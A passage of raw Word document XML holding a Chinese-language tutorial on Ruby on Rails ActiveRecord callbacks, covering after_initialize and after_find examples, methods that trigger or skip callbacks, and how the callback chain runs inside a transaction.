              <w:t xml:space="preserve"> do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C85725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puts "You have initialized an object!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="368070B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7871C32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3F5957E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55025F">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_find</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="618D5E5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puts "You have found an object!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0768A59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54A4787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44AEC12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F33DC8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User.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03A073E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You have initialized an object!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D8B096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#&lt;User id: nil&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19F4C63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5E658B0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User.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7893F50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You have found an object!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F2B9A5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You have initialized an object!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26CD714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#&lt;User id: 1&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C67A9F5"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12 执行回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF01C9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55025F">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>下面的方法会触发回调</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29854E48" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A18E4F0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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create!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3160C52C" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2813C1A7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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decrement!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68790718" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18F8DDE4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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destroy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E652C7A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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destroy_all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061219F6" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A680416" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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increment!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7A979A" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73718992" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B78E1D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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save!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD3D3EA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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save(:validate =&gt; false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D16F9B7" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="527588A1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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toggle!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1576A43F" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0207736A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E364B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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update_attribute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189B13E7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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update_attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10574C7A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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update_attributes!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0387B24C" w14:textId="77777777" w:rsidR="0055025F" w:rsidRPr="002A2B82" w:rsidRDefault="0055025F" w:rsidP="0055025F">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="001DA9B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="0055025F">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valid?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D043FE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另外，</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF489B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF489B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调只会被下面列出的方法触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771333EA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BB816C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5260ECAB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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find</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B642D31" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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find_all_by_</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>attribute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D269F2B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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find_by_</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>attribute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB523E4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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find_by_</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>attribute</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392EB1A1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>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rPr>
        <w:t>last</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F61321F"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而 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF489B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF489B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调在每次新AR对象初始化时都会被触发</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECCB7C9"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13 跳过回调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB382C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和校验相同，我们也可以跳过回调。但是这些方法使用是必须多加注意，因为</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF489B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>回调中可能含有重要的业务逻辑。在没有完全理解其潜在危险的情况下贸然使用可能会导致无效数据的产生</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AC96DB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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decrement</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332440ED" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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decrement_counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355E1CFE" w14:textId="77777777" w:rsidR="00CF489B" w:rsidRPr="002A2B82" w:rsidRDefault="00CF489B" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10DB9732" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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delete</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53441D7F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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delete_all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768B18BB" w14:textId="77777777" w:rsidR="00CF489B" w:rsidRPr="002A2B82" w:rsidRDefault="00CF489B" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="772C8426" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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find_by_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5140C3AE" w14:textId="77777777" w:rsidR="00CF489B" w:rsidRPr="002A2B82" w:rsidRDefault="00CF489B" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01D69F0B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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increment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A01894" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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increment_counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9FCCE4" w14:textId="77777777" w:rsidR="00CF489B" w:rsidRPr="002A2B82" w:rsidRDefault="00CF489B" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15DBA65C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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toggle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59842922" w14:textId="77777777" w:rsidR="00CF489B" w:rsidRPr="002A2B82" w:rsidRDefault="00CF489B" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2689D191" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>touch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2AE32E" w14:textId="77777777" w:rsidR="00CF489B" w:rsidRPr="002A2B82" w:rsidRDefault="00CF489B" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10397FB8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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update_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E579BC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">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update_all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667BC423" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00CF489B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update_counters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35205E50"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14 执行挂起</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CEF69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当你为模型注册回调时，他们将会被放入队列中执行。这个队列中将包括模型所有的校验，所有注册的回调，以及对数据库的操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD7867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4D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>整个回调链封装在一个事务中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">如果任何一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>before</w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调方法返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者抛出异常，整个执行链会中止并且回滚</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">；而 </w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>after</w:t>
      </w:r>
      <w:r w:rsidRPr="004D6745">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
